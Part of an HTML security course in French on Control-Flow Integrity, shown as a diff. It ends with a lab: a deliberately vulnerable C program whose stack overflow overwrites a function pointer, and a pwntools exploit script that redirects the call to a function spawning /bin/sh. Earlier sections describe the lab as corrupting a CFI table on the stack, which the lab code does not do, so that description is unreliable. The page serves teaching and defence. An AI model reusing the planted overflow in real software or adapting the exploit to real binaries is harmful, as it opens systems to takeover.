+            Microsoft Control Flow Guard (CFG), introduit dans Windows 8.1 Update 3, est souvent cité comme un exemple de CFI à granularité intermédiaire. Il maintient une bitmap des adresses de début de fonctions valides et vérifie chaque appel indirect contre cette bitmap. Efficace contre les attaques naïves, mais plusieurs techniques de contournement ont été publiées, notamment en ciblant des fonctions "trop permissives" présentes dans l'ensemble des cibles valides.
+        </p>
+
+        <h3 data-i18n="s5_h3_2">CFI fin (fine-grained)</h3>
+        <p data-i18n="s5_p4">
+            Un CFI fin restreint l'ensemble des cibles valides site par site. Pour un appel indirect à un endroit précis du code, seules les fonctions dont la <em>signature de type est compatible</em> sont des cibles valides. Clang CFI (disponible via le flag <code>-fsanitize=cfi</code>) implémente plusieurs variantes de CFI fin :
+        </p>
+        <p data-i18n="s5_p5">
+            <code>-fsanitize=cfi-icall</code> protège les appels de fonctions indirects en vérifiant que la fonction appelée a exactement le bon type. <code>-fsanitize=cfi-vcall</code> protège les appels virtuels C++ en vérifiant que le receveur a le bon type dynamique. Ces vérifications sont bien plus restrictives et réduisent drastiquement l'espace des cibles disponibles pour un attaquant.
+        </p>
+
+        <table class="tbl">
+            <thead>
+                <tr><th data-i18n="s5_th1">Approche</th><th data-i18n="s5_th2">Granularité</th><th data-i18n="s5_th3">Overhead perf.</th><th data-i18n="s5_th4">Résistance</th></tr>
+            </thead>
+            <tbody>
+                <tr><td data-i18n="s5_td1_1">Microsoft CFG</td><td data-i18n="s5_td1_2">Entrées de fonctions</td><td><span class="bdg g">~1%</span></td><td><span class="bdg a" data-i18n="s5_td1_4">Modérée</span></td></tr>
+                <tr><td data-i18n="s5_td2_1">Clang CFI icall</td><td data-i18n="s5_td2_2">Compatibilité de type</td><td><span class="bdg b">~2-5%</span></td><td><span class="bdg g" data-i18n="s5_td2_4">Bonne</span></td></tr>
+                <tr><td data-i18n="s5_td3_1">Clang CFI vcall</td><td data-i18n="s5_td3_2">Hiérarchie de classes</td><td><span class="bdg b">~2-5%</span></td><td><span class="bdg g" data-i18n="s5_td3_4">Bonne</span></td></tr>
+                <tr><td data-i18n="s5_td4_1">Intel CET (shadow stack)</td><td data-i18n="s5_td4_2">Retours seulement</td><td><span class="bdg g" data-i18n="s5_td4_3">Hardware</span></td><td><span class="bdg g" data-i18n="s5_td4_4">Très bonne</span></td></tr>
+                <tr><td data-i18n="s5_td5_1">CFI maison (table sur pile)</td><td data-i18n="s5_td5_2">Table statique simple</td><td><span class="bdg g" data-i18n="s5_td5_3">Minimal</span></td><td><span class="bdg r" data-i18n="s5_td5_4">Faible</span></td></tr>
+            </tbody>
+        </table>
+
+        <!-- 06 -->
+        <h2 data-i18n="s6_h2">06 - Implémentations réelles du CFI</h2>
+
+        <h3 data-i18n="s6_h3_1">Clang CFI (LLVM)</h3>
+        <p data-i18n="s6_p1">
+            L'implémentation la plus rigoureuse sur Linux/macOS. Elle opère entièrement au niveau du compilateur et insère des vérifications inline avant chaque transfert indirect. Les métadonnées (tables de types, informations de hiérarchie de classes) sont stockées dans des sections en lecture seule du binaire, protégées par les permissions de pages. Clang CFI supporte plusieurs modes : <code>cfi-icall</code>, <code>cfi-vcall</code>, <code>cfi-nvcall</code>, <code>cfi-derived-cast</code>, <code>cfi-unrelated-cast</code>.
+        </p>
+
+<div class="border border-gray-700 mb-12 rounded-sm overflow-hidden">
+    <div class="bg-gray-950 px-4 py-3 border-b border-gray-700 flex justify-between items-center">
+        <div class="flex items-center gap-3">
+            <div class="flex gap-1.5">
+                <span class="w-2.5 h-2.5 rounded-full bg-red-500"></span>
+                <span class="w-2.5 h-2.5 rounded-full bg-yellow-500"></span>
+                <span class="w-2.5 h-2.5 rounded-full bg-green-500"></span>
+            </div>
+            <span class="w-px h-4 bg-gray-700"></span>
+            
+            <span class="mono text-[10px] font-bold text-gray-400 tracking-widest">compilation</span>
+            <span class="mono text-[9px] text-gray-600 tracking-widest">- Clang CFI</span>
+        </div>
+        <button onclick="copyToClipboard('code-clang', this)" class="mono text-[10px] font-bold text-gray-500 hover:text-white transition-colors flex items-center gap-1.5" data-i18n="btn_copy">
+            <i class="far fa-copy"></i> COPIER
+        </button>
+    </div>
+    <pre class="bg-gray-950 text-gray-300 p-6 overflow-x-auto text-[12px] leading-relaxed mono no-scrollbar" id="code-clang">
+<span class="text-gray-600"># CFI complet pour les appels indirects et vtables</span>
+clang++ -flto -fsanitize=cfi -fvisibility=hidden \
+        -o programme source.cpp
+
+<span class="text-gray-600"># Mode diagnostic (log sans crash)</span>
+clang++ -flto -fsanitize=cfi -fno-sanitize-trap=cfi \
+        -fsanitize-recover=cfi -o programme source.cpp</pre>
+</div>
+
+        <h3 data-i18n="s6_h3_2">Microsoft Control Flow Guard (CFG)</h3>
+        <p data-i18n="s6_p2">
+            Intégré dans le compilateur MSVC et le système Windows depuis Windows 8.1 Update 3. Le mécanisme repose sur une bitmap en mémoire indiquant quelles adresses sont des débuts de fonctions valides. Avant chaque appel indirect, le compilateur insère un appel à une routine de validation du noyau. CFG est activé par défaut pour les binaires système Windows modernes.
+        </p>
+
+        <h3 data-i18n="s6_h3_3">Intel CET : Control-flow Enforcement Technology</h3>
+        <p data-i18n="s6_p3">
+            CET est une extension matérielle introduite dans les processeurs Intel Tiger Lake (2020) et AMD Zen 3 (2020). Elle se compose de deux mécanismes complémentaires. La <strong>Shadow Stack</strong> (SS) maintient une pile d'adresses de retour séparée dans une région mémoire spéciale, accessible uniquement par des instructions privilégiées. À chaque <code>ret</code>, le processeur compare l'adresse dépilée de la pile normale avec celle de la shadow stack : toute discordance déclenche une exception. La deuxième fonctionnalité, <strong>Indirect Branch Tracking</strong> (IBT), exige que chaque destination d'un saut indirect commence par une instruction spéciale <code>endbr64</code>. Toute tentative de sauter vers un gadget interne à une fonction (sans <code>endbr64</code>) est bloquée au niveau matériel.
+        </p>
+
+        <div class="box ok">
+            <div class="box-title" data-i18n="s6_b_t">Avantage de CET</div>
+            <p data-i18n="s6_b_p">Étant implémentée en hardware, la Shadow Stack est beaucoup plus difficile à contourner qu'un CFI logiciel. Elle ne dépend pas de la précision du CFG et protège tous les retours de fonctions, même ceux de bibliothèques non recompilées avec CFI.</p>
+        </div>
+
+        <!-- 07 -->
+        <h2 data-i18n="s7_h2">07 - Limites du CFI et vecteurs d'attaque</h2>
+
+        <p data-i18n="s7_p1">
+            Malgré sa puissance, le CFI n'est pas une panacée. Des chercheurs ont identifié plusieurs classes d'attaques qui permettent de le contourner, même dans ses variantes les plus rigoureuses.
+        </p>
+
+        <h3 data-i18n="s7_h3_1">Attaques sur le CFG lui-meme</h3>
+        <p data-i18n="s7_p2">
+            Si les métadonnées du CFG (tables de types, bitmaps de fonctions valides) sont stockées dans une région mémoire accessible en écriture, un attaquant disposant d'une primitive d'écriture arbitraire peut les corrompre. C'est précisément la vulnérabilité que nous exploiterons dans le laboratoire : une table CFI stockée sur la pile est corruptible par le même overflow qui corrompt le callback.
+        </p>
+
+        <h3 data-i18n="s7_h3_2">Call-oriented Programming (COP)</h3>
+        <p data-i18n="s7_p3">
+            Analogue au ROP, le COP exploite le fait qu'un CFI grossier autorise des centaines de fonctions comme cibles valides. Un attaquant peut enchaîner des appels vers des fonctions légitimes mais "dangereuses", des fonctions dont la combinaison produit un effet malveillant. Si <code>system()</code> est dans l'ensemble des cibles valides (ce qui est souvent le cas dans un programme qui l'utilise légitimement), un attaquant peut y sauter directement.
+        </p>
+
+        <h3 data-i18n="s7_h3_3">Jump-oriented Programming (JOP)</h3>
+        <p data-i18n="s7_p4">
+            Le JOP est une variante du ROP qui utilise des gadgets se terminant par <code>jmp reg</code> plutôt que <code>ret</code>. Un CFI fin protégeant les retours mais pas tous les sauts indirects peut être contourné par cette technique.
+        </p>
+
+        <h3 data-i18n="s7_h3_4">TOCTTOU sur les verifications CFI</h3>
+        <p data-i18n="s7_p5">
+            Time-of-Check-Time-of-Use : si la vérification CFI et l'utilisation effective du pointeur ne sont pas atomiques, un thread concurrent peut modifier le pointeur entre les deux. Cette fenêtre de race condition est généralement très étroite mais a été démontrée dans des contextes spécifiques.
+        </p>
+
+        <div class="box danger">
+            <div class="box-title" data-i18n="s7_b_t">La lecon fondamentale</div>
+            <p data-i18n="s7_b_p">Un CFI est aussi fort que ses hypothèses. Si l'attaquant peut corrompre les métadonnées du CFI lui-même, ou si l'ensemble des cibles valides est trop large, la protection est contournée. Un CFI robuste doit stocker ses données de référence dans une mémoire immuable et utiliser un CFG aussi précis que possible.</p>
+        </div>
+
+        <!-- 08 -->
+        <h2 data-i18n="s8_h2">08 - Data-Oriented Programming (DOP)</h2>
+
+        <p data-i18n="s8_p1">
+            Le <strong>Data-Oriented Programming</strong> est une technique d'exploitation avancée formalisée par Hong Hu, Shweta Shinde, Sendroiu Adrian, Prateek Saxena et Zhenkai Liang en 2016. Là où le ROP et le JOP détournent le <em>flot de contrôle</em>, le DOP manipule uniquement des <strong>données</strong> pour produire un effet malveillant, tout en maintenant un flot de contrôle apparemment légitime.
+        </p>
+
+        <h3 data-i18n="s8_h3_1">Le principe</h3>
+        <p data-i18n="s8_p2">
+            Dans un programme vulnérable, certaines variables de données influencent le comportement du programme de façon significative : elles sont lues lors de comparaisons, utilisées comme indices, passées comme arguments à des fonctions sensibles. Un attaquant DOP identifie ces variables (<em>data gadgets</em>) et exploite une primitive d'écriture pour les corrompre, orientant ainsi le programme vers un comportement non prévu sans jamais modifier une adresse de retour ni violer un invariant CFI.
+        </p>
+
+        <h3 data-i18n="s8_h3_2">Pourquoi c'est puissant face au CFI</h3>
+        <p data-i18n="s8_p3">
+            Un CFI ne surveille que les transferts de contrôle. Il ne dit rien sur les données. Si un attaquant peut amener le programme à appeler <code>system("/bin/sh")</code> via un chemin de code parfaitement légitime, en corrompant l'argument passé à une fonction autorisée, ou en corrompant une variable de condition, le CFI ne voit rien d'anormal.
+        </p>
+        <p data-i18n="s8_p4">
+            Dans notre laboratoire, nous allons utiliser une forme de DOP : plutôt que de modifier une adresse de retour, nous allons corrompre la <strong>table de vérification CFI elle-même</strong>, qui est une donnée sur la pile. Le flot de contrôle passe par le chemin "légitime" d'appel du callback, mais les données qui définissent ce qui est "légitime" ont été altérées.
+        </p>
+
+        <!-- 09 -->
+        <h2 data-i18n="s9_h2">09 - Contre-mesures et CFI robuste</h2>
+
+        <p data-i18n="s9_p1">
+            Face aux vecteurs d'attaque identifiés, plusieurs bonnes pratiques permettent de renforcer considérablement un mécanisme CFI.
+        </p>
+
+        <h3 data-i18n="s9_h3_1">Immuabilité des métadonnées</h3>
+        <p data-i18n="s9_p2">
+            La règle la plus importante : les tables de fonctions valides, les bitmaps CFG, et toute métadonnée utilisée pour les vérifications CFI doivent être stockées dans des sections en lecture seule (<code>.rodata</code>) ou dans des pages mémoire marquées non-writable après initialisation (<code>mprotect(PROT_READ)</code>). Un attaquant qui ne peut pas écrire dans ces régions ne peut pas corrompre le CFG.
+        </p>
+
+        <h3 data-i18n="s9_h3_2">Cloisonnement mémoire</h3>
+        <p data-i18n="s9_p3">
+            Les données de vérification ne doivent jamais être adjacentes aux buffers manipulés par l'utilisateur. Idéalement, elles sont dans un segment mémoire séparé, protégé par des guard pages.
+        </p>
+
+        <h3 data-i18n="s9_h3_3">CFG le plus fin possible</h3>
+        <p data-i18n="s9_p4">
+            Minimiser l'ensemble des cibles valides pour chaque site d'appel. Si un pointeur de fonction est toujours utilisé pour appeler des fonctions de type <code>void (*)(int)</code>, seules les fonctions avec cette signature exacte devraient être dans l'ensemble des cibles.
+        </p>
+
+        <h3 data-i18n="s9_h3_4">Defense en profondeur</h3>
+        <p data-i18n="s9_p5">
+            Le CFI ne doit pas être la seule ligne de défense. Combiné avec SafeStack (qui sépare la pile de retour des buffers de données), avec des stack canaries, avec l'ASLR et avec des sanitizers mémoire en développement (<code>AddressSanitizer</code>, <code>MemorySanitizer</code>), il forme une défense en profondeur bien plus robuste.
+        </p>
+
+        <div class="steps">
+            <div class="step">
+                <div class="sn">1</div>
+                <div>
+                    <div class="sb-title" data-i18n="s9_st1_t">Métadonnées en mémoire immuable</div>
+                    <div class="sb-desc" data-i18n="s9_st1_d">Stocker les tables CFI dans des sections <code>.rodata</code> ou des pages protégées avec <code>mprotect(PROT_READ)</code> après initialisation.</div>
+                </div>
+            </div>
+            <div class="step">
+                <div class="sn">2</div>
+                <div>
+                    <div class="sb-title" data-i18n="s9_st2_t">Utiliser un compilateur CFI éprouvé</div>
+                    <div class="sb-desc" data-i18n="s9_st2_d">Préférer Clang CFI (<code>-fsanitize=cfi</code>) ou Intel CET plutôt qu'une implémentation maison. Les implémentations maison ont presque invariablement des failles.</div>
+                </div>
+            </div>
+            <div class="step">
+                <div class="sn">3</div>
+                <div>
+                    <div class="sb-title" data-i18n="s9_st3_t">SafeStack + stack canaries</div>
+                    <div class="sb-desc" data-i18n="s9_st3_d">SafeStack (<code>-fsanitize=safe-stack</code>) sépare la pile de retour des buffers locaux, neutralisant les overflows classiques. Les canaries détectent les corruptions avant le retour.</div>
+                </div>
+            </div>
+            <div class="step">
+                <div class="sn">4</div>
+                <div>
+                    <div class="sb-title" data-i18n="s9_st4_t">Bounded reads : ne jamais lire plus que la taille du buffer</div>
+                    <div class="sb-desc" data-i18n="s9_st4_d">La cause profonde reste toujours la même : lire des données non bornées dans un buffer fixe. <code>read(fd, buf, sizeof(buf))</code> élimine la vulnérabilité à la source.</div>
+                </div>
+            </div>
+        </div>
+
+        
+        <!-- 10 -->
+        <h2 data-i18n="s10_h2">10 - Laboratoire : vuln, un CFI fin réel à contourner</h2>
+
+        <div class="lab-banner">
+            <i class="fas fa-flask lab-icon"></i>
+            <div>
+                <div class="lab-title" data-i18n="s10_lab_title">⚗ Laboratoire pratique</div>
+                <div class="lab-sub" data-i18n="s10_lab_sub">Ce chapitre applique tous les concepts vus précédemment sur un binaire compilé avec <strong>Clang CFI fin réel</strong> (<code>-fsanitize=cfi -fvisibility=hidden -flto</code>). Le challenge révèle une limite fondamentale que même un CFI fin ne peut pas couvrir seul.</div>
+            </div>
+        </div>
+
+                <h3 data-i18n="s10_h3_1">Code source complet</h3>
+
+<div class="border border-gray-700 mb-12 rounded-sm overflow-hidden">
+    <div class="bg-gray-950 px-4 py-3 border-b border-gray-700 flex justify-between items-center">
+        <div class="flex items-center gap-3">
+            <div class="flex gap-1.5">
+                <span class="w-2.5 h-2.5 rounded-full bg-red-500"></span>
+                <span class="w-2.5 h-2.5 rounded-full bg-yellow-500"></span>
+                <span class="w-2.5 h-2.5 rounded-full bg-green-500"></span>
+            </div>
+            <span class="w-px h-4 bg-gray-700"></span>
+            <span class="font-mono text-[10px] font-bold text-gray-400 tracking-widest">vuln.c</span>
+        </div>
+        <button onclick="copyToClipboard('code-vuln-complete', this)" class="font-mono text-[10px] font-bold text-gray-500 hover:text-white transition-colors flex items-center gap-1.5" data-i18n="btn_copy">
+            <i class="far fa-copy"></i> COPIER
+        </button>
+    </div>
+    <pre class="bg-gray-950 text-gray-300 p-6 overflow-x-auto text-[12px] leading-relaxed font-mono no-scrollbar" id="code-vuln-complete"><span style="color:#6e7681">//clang -fno-pie -no-pie -flto -fsanitize=cfi -fvisibility=hidden -o vuln vuln.c</span>
+
+<span style="color:#ff7b72">#include</span> <span style="color:#a5d6ff">&lt;stdio.h&gt;</span>
+<span style="color:#ff7b72">#include</span> <span style="color:#a5d6ff">&lt;unistd.h&gt;</span>
+<span style="color:#ff7b72">#include</span> <span style="color:#a5d6ff">&lt;stdlib.h&gt;</span>
+
+<span style="color:#d2a8ff">__attribute__</span>((used))
+<span style="color:#ff7b72">void</span> <span style="color:#d2a8ff">admin_shell</span>() {
+    <span style="color:#d2a8ff">printf</span>(<span style="color:#a5d6ff">"[+] Accès root accordé.\n"</span>);
+    <span style="color:#d2a8ff">system</span>(<span style="color:#a5d6ff">"/bin/sh"</span>);
+}
+
+<span style="color:#ff7b72">void</span> <span style="color:#d2a8ff">regular_user</span>() {
+    <span style="color:#d2a8ff">printf</span>(<span style="color:#a5d6ff">"Bonjour, utilisateur standard !\n"</span>);
+}
+
+<span style="color:#ff7b72">struct</span> <span style="color:#ffa657">UserData</span> {
+    <span style="color:#ff7b72">char</span> buffer[<span style="color:#79c0ff">32</span>];
+    <span style="color:#ff7b72">void</span> (*action)(); 
+};
+
+<span style="color:#ff7b72">void</span> <span style="color:#d2a8ff">process_user</span>() {
+    <span style="color:#ff7b72">struct</span> <span style="color:#ffa657">UserData</span> data;
+    data.action = regular_user;
+    
+    <span style="color:#d2a8ff">printf</span>(<span style="color:#a5d6ff">"Entrez votre nom : "</span>);
+    <span style="color:#d2a8ff">fflush</span>(stdout);
+    
+    <span style="color:#6e7681">// VULNÉRABILITÉ : On lit 128 octets dans un buffer prévu pour 32.</span>
+    <span style="color:#d2a8ff">read</span>(<span style="color:#79c0ff">0</span>, data.buffer, <span style="color:#79c0ff">128</span>); 
+    
+    <span style="color:#6e7681">// Appel indirect</span>
+    data.action(); 
+}
+
+<span style="color:#ff7b72">int</span> <span style="color:#d2a8ff">main</span>() {
+    <span style="color:#d2a8ff">process_user</span>();
+    <span style="color:#ff7b72">return</span> <span style="color:#79c0ff">0</span>;
+}</pre>
+</div>
+
+        <h3 data-i18n="s10_h3_2">Contexte : la commande de compilation</h3>
+        <p data-i18n="s10_p1">Le programme <code>vuln.c</code> est compilé directement avec les flags Clang CFI de production :</p>
+
+        <div class="border border-gray-700 mb-12 rounded-sm overflow-hidden">
+    <div class="bg-gray-950 px-4 py-3 border-b border-gray-700 flex justify-between items-center">
+        <div class="flex items-center gap-3">
+            <div class="flex gap-1.5">
+                <span class="w-2.5 h-2.5 rounded-full bg-red-500"></span>
+                <span class="w-2.5 h-2.5 rounded-full bg-yellow-500"></span>
+                <span class="w-2.5 h-2.5 rounded-full bg-green-500"></span>
+            </div>
+            <span class="w-px h-4 bg-gray-700"></span>
+            
+            <span class="font-mono text-[10px] font-bold text-gray-400 tracking-widest">compilation</span>
+            <span class="font-mono text-[9px] text-gray-600 tracking-widest">- Clang CFI</span>
+        </div>
+        <button onclick="copyToClipboard('code-vuln-compile', this)" class="font-mono text-[10px] font-bold text-gray-500 hover:text-white transition-colors flex items-center gap-1.5" data-i18n="btn_copy">
+            <i class="far fa-copy"></i> COPIER
+        </button>
+    </div>
+    <pre class="bg-gray-950 text-gray-300 p-6 overflow-x-auto text-[12px] leading-relaxed font-mono no-scrollbar" id="code-vuln-compile">clang -fno-pie -no-pie -flto -fsanitize=cfi -fvisibility=hidden -o vuln vuln.c</pre>
+</div>
+
+        <p data-i18n="s10_p2"><code>-fno-pie -no-pie</code> désactive le Position Independent Executable : les adresses des fonctions sont fixes et lisibles directement depuis la table de symboles ELF, sans besoin de fuite mémoire. <code>-flto</code> active la Link-Time Optimization, prérequis technique de Clang CFI : le compilateur a besoin d'une vision globale du programme pour construire son CFG et insérer les vérifications de type. <code>-fsanitize=cfi</code> avec <code>-fvisibility=hidden</code> est l'implémentation CFI <em>fine</em> de Clang LLVM. Le compilateur construit un CFG précis et insère des vérifications de compatibilité de type <strong>par site d'appel</strong> avant chaque transfert indirect.</p>
+
+        <h3 data-i18n="s10_h3_3">La question centrale</h3>
+        <p data-i18n="s10_p3">Si Clang CFI fin est actif et insère de vraies vérifications par site d'appel, comment est-il possible de rediriger l'exécution vers <code>admin_shell()</code> ? La réponse ne tient pas dans un contournement du CFI du compilateur. Elle tient dans ce que le CFI vérifie exactement, et ce qu'il est <strong>structurellement incapable</strong> de vérifier.</p>
+
+        <div class="box danger">
+            <div class="box-title" data-i18n="s10_b_t">La limite sémantique du CFI fin</div>
+            <p data-i18n="s10_b_p">Clang CFI fin vérifie les <strong>types</strong>, pas les <strong>intentions</strong>. Il ne sait pas quelles fonctions sont censées être appelées par ce chemin précis : il sait uniquement lesquelles ont la bonne signature. <code>regular_user</code> et <code>admin_shell</code> ont toutes deux la signature <code>void (*)().</code> Pour le compilateur, les deux sont des cibles équivalentes et légitimes.</p>
+        </div>
+
+        <h3 data-i18n="s10_h3_4">La vulnérabilité : le stack buffer overflow</h3>
+        <p data-i18n="s10_p4">La faille est explicite dans le source. <code>read</code> accepte 128 octets pour un buffer de seulement 32 octets :</p>
+
+        <div class="border border-gray-700 mb-12 rounded-sm overflow-hidden">
+    <div class="bg-gray-950 px-4 py-3 border-b border-gray-700 flex justify-between items-center">
+        <div class="flex items-center gap-3">
+            <div class="flex gap-1.5">
+                <span class="w-2.5 h-2.5 rounded-full bg-red-500"></span>
+                <span class="w-2.5 h-2.5 rounded-full bg-yellow-500"></span>
+                <span class="w-2.5 h-2.5 rounded-full bg-green-500"></span>
+            </div>
+            <span class="w-px h-4 bg-gray-700"></span>
+            
+            <span class="font-mono text-[10px] font-bold text-gray-400 tracking-widest">vuln.c</span>
+        </div>
+        <button onclick="copyToClipboard('code-vuln-vuln', this)" class="font-mono text-[10px] font-bold text-gray-500 hover:text-white transition-colors flex items-center gap-1.5" data-i18n="btn_copy">
+            <i class="far fa-copy"></i> COPIER
+        </button>
+    </div>
+    <pre class="bg-gray-950 text-gray-300 p-6 overflow-x-auto text-[12px] leading-relaxed font-mono no-scrollbar" id="code-vuln-vuln"><span style="color:#ff7b72">struct</span> <span style="color:#ffa657">UserData</span> {
+    <span style="color:#ff7b72">char</span> buffer[<span style="color:#79c0ff">32</span>];           <span style="color:#6e7681">// 32 octets seulement</span>
+    <span style="color:#ff7b72">void</span> (*action)();          <span style="color:#6e7681">// pointeur de fonction</span>
+};
+
+<span style="color:#ff7b72">read</span>(<span style="color:#79c0ff">0</span>, data.buffer, <span style="color:#79c0ff">128</span>);     <span style="color:#6e7681">// OVERFLOW : lit 128 octets</span></pre>
+</div>
+
+        <p data-i18n="s10_p5">L'overflow écrit 128 octets à partir de l'adresse de <code>data.buffer</code>. Les 32 premiers octets remplissent le buffer, les octets 32-39 écrasent <code>data.action</code> avec l'adresse que l'attaquant choisit. C'est du <strong>Data-Oriented Programming pur</strong> : aucune modification de flot de contrôle classique, uniquement une corruption de données.</p>
+
+        <div class="border border-gray-700 mb-12 rounded-sm overflow-hidden">
+            <div class="bg-gray-950 px-4 py-3 border-b border-gray-700 flex items-center gap-3">
+                <div class="flex gap-1.5">
+                    <span class="w-2.5 h-2.5 rounded-full bg-red-500"></span>
+                    <span class="w-2.5 h-2.5 rounded-full bg-yellow-500"></span>
+                    <span class="w-2.5 h-2.5 rounded-full bg-green-500"></span>
+                </div>
+                <span class="w-px h-4 bg-gray-700"></span>
+                <i class="fas fa-layer-group text-gray-500 text-xs"></i>
+                <span class="mono text-[10px] font-bold text-gray-400 tracking-widest">Memory_Layout // struct UserData Overflow</span>
+            </div>
+            <div class="bg-gray-950 p-6 font-mono text-sm space-y-2">
+                <div class="flex gap-4 border-b border-gray-800 pb-2">
+                    <div class="w-16 text-gray-600 text-xs mt-0.5">+0x00</div>
+                    <div class="flex-1 bg-gray-800/50 px-3 py-1 text-gray-500 flex justify-between">
+                        <span>data.buffer (32 bytes)</span>
+                        <span class="text-gray-400 text-xs font-normal" data-i18n="s10_mem1">Padding ('A' × 32)</span>
+                    </div>
+                </div>
+                <div class="flex gap-4 border-b border-gray-800 pb-2">
+                    <div class="w-16 text-red-500 text-xs mt-0.5 font-bold">+0x20</div>
+                    <div class="flex-1 border border-red-500/50 bg-red-500/10 px-3 py-1 font-bold text-red-400 flex justify-between">
+                        <span>data.action (8 bytes)</span>
+                        <span class="text-red-400 text-xs font-normal" data-i18n="s10_mem2">← OVERWRITTEN: addr(admin_shell)</span>
+                    </div>
+                </div>
+                <div class="flex gap-4 pb-2">
+                    <div class="w-16 text-gray-600 text-xs mt-0.5">+0x28</div>
+                    <div class="flex-1 border border-gray-800 border-dashed px-3 py-1 text-gray-600 flex justify-between">
+                        <span data-i18n="s10_mem3">Reste de la pile (88 bytes)</span>
+                        <span class="text-gray-500 text-xs font-normal" data-i18n="s10_mem4">Débordement continu ('A' × 88)</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <h3 data-i18n="s10_h3_5">Enchaînement des vérifications après le payload</h3>
+
+        <div class="steps">
+            <div class="step">
+                <div class="sn">1</div>
+                <div>
+                    <div class="sb-title" data-i18n="s10_st1_t">Construction du payload</div>
+                    <div class="sb-desc" data-i18n="s10_st1_d">L'adresse de <code>admin_shell</code> est récupérée depuis la table ELF. On construit : 32 octets de remplissage ("A") suivi de l'adresse encodée en little-endian sur 8 octets via <code>p64(admin_addr)</code>.</div>
+                </div>
+            </div>
+            <div class="step">
+                <div class="sn">2</div>
+                <div>
+                    <div class="sb-title" data-i18n="s10_st2_t">Corruption de data.action</div>
+                    <div class="sb-desc" data-i18n="s10_st2_d">Octets 32-39 du payload écrasent le pointeur <code>data.action</code> avec l'adresse d'<code>admin_shell</code>.</div>
+                </div>
+            </div>
+            <div class="step">
+                <div class="sn">3</div>
+                <div>
+                    <div class="sb-title" data-i18n="s10_st3_t">Clang CFI valide le type</div>
+                    <div class="sb-desc" data-i18n="s10_st3_d">Le code CFI inséré par Clang vérifie que <code>admin_shell</code> est de type <code>void (*)().</code> compatible avec le site d'appel. C'est le cas : aucun <code>abort()</code>.</div>
+                </div>
+            </div>
+            <div class="step">
+                <div class="sn">4</div>
+                <div>
+                    <div class="sb-title" data-i18n="s10_st4_t">Appel effectif de admin_shell</div>
+                    <div class="sb-desc" data-i18n="s10_st4_d"><code>data.action()</code> appelle <code>admin_shell</code>, qui exécute <code>system("/bin/sh")</code>. Un shell est obtenu.</div>
+                </div>
+            </div>
+        </div>
+
+
+        <h3 data-i18n="s10_h3_6">Script d'exploitation</h3>
+
+<div class="border border-gray-700 mb-12 rounded-sm overflow-hidden">
+    <div class="bg-gray-950 px-4 py-3 border-b border-gray-700 flex justify-between items-center">
+        <div class="flex items-center gap-3">
+            <div class="flex gap-1.5">
+                <span class="w-2.5 h-2.5 rounded-full bg-red-500"></span>
+                <span class="w-2.5 h-2.5 rounded-full bg-yellow-500"></span>
+                <span class="w-2.5 h-2.5 rounded-full bg-green-500"></span>
+            </div>
+            <span class="w-px h-4 bg-gray-700"></span>
+            
+            <span class="font-mono text-[10px] font-bold text-gray-400 tracking-widest">sh.py</span>
+        </div>
+        <button onclick="copyToClipboard('code-sh-complete', this)" class="font-mono text-[10px] font-bold text-gray-500 hover:text-white transition-colors flex items-center gap-1.5" data-i18n="btn_copy">
+            <i class="far fa-copy"></i> COPIER
+        </button>
+    </div>
+    <pre class="bg-gray-950 text-gray-300 p-6 overflow-x-auto text-[12px] leading-relaxed font-mono no-scrollbar" id="code-sh-complete"><span style="color:#ff7b72">#!/usr/bin/env</span> python3
+<span style="color:#ff7b72">from</span> pwn <span style="color:#ff7b72">import</span> *
+
+context.arch = <span style="color:#a5d6ff">'amd64'</span>
+context.log_level = <span style="color:#a5d6ff">'info'</span>
+
+exe = <span style="color:#a5d6ff">'./vuln'</span>
+elf = <span style="color:#d2a8ff">ELF</span>(exe)
+
+<span style="color:#ff7b72">def</span> <span style="color:#d2a8ff">exploit</span>():
+    <span style="color:#6e7681"># Récupère l'adresse de admin_shell depuis la table de symboles ELF</span>
+    <span style="color:#6e7681"># Possible car -fno-pie désactive l'ASLR sur le binaire lui-même</span>
+    admin_addr = elf.symbols[<span style="color:#a5d6ff">'admin_shell'</span>]
+    <span style="color:#d2a8ff">log</span>.<span style="color:#d2a8ff">info</span>(<span style="color:#a5d6ff">f"Adresse de admin_shell() trouvée : {hex(admin_addr)}"</span>)
+
+    <span style="color:#6e7681"># Construction du payload : 32 octets de padding + l'adresse de admin_shell</span>
+    offset = <span style="color:#79c0ff">32</span>
+    padding = <span style="color:#a5d6ff">b"A"</span> * offset
+    payload = padding + <span style="color:#d2a8ff">p64</span>(admin_addr)
+    
+    <span style="color:#d2a8ff">log</span>.<span style="color:#d2a8ff">info</span>(<span style="color:#a5d6ff">f"Payload généré ({len(payload)} octets)"</span>)
+
+    <span style="color:#6e7681"># Lancement du processus</span>
+    p = <span style="color:#d2a8ff">process</span>(exe)
+
+    <span style="color:#6e7681"># On attend que le programme affiche son prompt</span>
+    p.<span style="color:#d2a8ff">recvuntil</span>(<span style="color:#a5d6ff">b"Entrez votre nom : "</span>)
+
+    <span style="color:#6e7681"># On envoie le payload</span>
+    <span style="color:#6e7681"># send() plutôt que sendline() : on ne veut pas ajouter de retour à la ligne inutile</span>
+    p.<span style="color:#d2a8ff">send</span>(payload)
+
+    <span style="color:#6e7681"># On prend la main sur le shell interactif obtenu</span>
+    p.<span style="color:#d2a8ff">interactive</span>()
+
+<span style="color:#ff7b72">if</span> __name__ == <span style="color:#a5d6ff">'__main__'</span>:
+    <span style="color:#d2a8ff">exploit</span>()</pre>
+</div>
+
+        <h3 data-i18n="s10_h3_7">Ce qu'il aurait fallu pour résister</h3>
+        <p data-i18n="s10_p6">La correction nécessite deux actions complémentaires. D'abord, stocker le pointeur <code>action</code> dans une région protégée ou le valider contre une whitelist en mémoire immuable. Ensuite, borner la lecture : <code>read(0, data.buffer, sizeof(data.buffer))</code> supprime la vulnérabilité à la source. Ces deux corrections ensemble rendent cet exploit impossible, indépendamment du CFI du compilateur.</p>
+
+        <div class="box ok">
+            <div class="box-title" data-i18n="s10_b2_t">La leçon du laboratoire</div>
+            <p data-i18n="s10_b2_p">Un CFI fin de compilateur ne remplace pas une architecture mémoire rigoureuse. Si les données sensibles (pointeurs de fonction, tables de vérification) vivent dans une région mutable adjacente aux buffers utilisateur, elles peuvent être corrompues avant même que le CFI du compilateur n'ait l'occasion d'intervenir. La défense en profondeur est la seule réponse complète.</p>
+        </div>
+
+        <!-- 11 REFERENCES -->
+        <h2 data-i18n="s11_h2">11 - References</h2>
+
+        <ul class="space-y-3">
